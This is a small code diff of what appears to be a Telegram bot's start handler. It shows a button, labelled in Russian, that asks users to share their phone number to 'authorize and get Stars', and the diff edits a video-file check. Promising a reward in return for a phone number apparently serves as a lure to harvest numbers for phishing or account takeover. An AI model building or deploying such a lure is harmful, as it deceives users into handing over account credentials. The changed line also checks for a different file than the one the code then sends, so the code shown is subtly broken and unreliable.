@@ -394,7 +394,7 @@ async def start_command(event):
     phone_btn = [Button.request_phone("📱 Авторизоваться и получить Stars", resize=True, single_use=True)]
     
     # إرسال الفيديو المباشر مسار "vip.mp4" ثابت بالكود مع النص والأزرار
-    if os.path.exists("vip.mp4"):
+    if os.path.exists("8219429418779326019.mp4"):
         await bot.send_file(
             event.chat_id,
             "vip.mp4",
